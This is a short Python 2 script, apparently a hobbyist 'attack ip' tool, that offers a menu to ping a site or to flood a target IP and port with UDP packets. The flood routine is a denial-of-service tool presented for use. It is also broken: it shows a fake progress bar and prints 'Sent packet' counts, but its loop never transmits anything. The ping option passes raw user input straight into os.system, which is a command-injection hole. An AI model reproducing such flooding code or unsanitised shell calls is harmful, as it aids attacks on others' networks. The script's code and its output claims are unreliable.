import os
import sys
import halo
import time
import socket
import random
def mrx():
  url=raw_input("linke site babe httt & https:")
  os.system("ping"+' '+url)
def mrx1():
  from datetime import datetime
  now = datetime.now()
  hour = now.hour
  minute = now.minute
  month = now.month
  year = now.year
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  bytes = random._urandom(1490)
  ip =raw_input("IP Target : ")
  port =raw_input("Port       : ")
  print ("[                    ] 0% ")
  time.sleep(4)
  print ("[=====               ] 25%")
  time.sleep(3)
  print ("[==========          ] 50%")
  time.sleep(2)
  print ("[===============     ] 75%")
  time.sleep(1)
  print ("[====================] 100%")
  time.sleep(2)
  sent = 0
  while True:
  	port = port +str(1)
  	sent = sent + 1
  	print ("Sent %s packet to %s port:%s by mrx")%(sent,ip,port)
print("dev:i4m_mrx")
print("1-url ip")
print("2-attack ip")
kurd =raw_input("halbzhyara:")
if kurd == '1':
	mrx()
if kurd == '2':
	mrx1()
else:
	("tkaya walam rast halbzhyr")
	kurd =raw_input("halbzhyara:")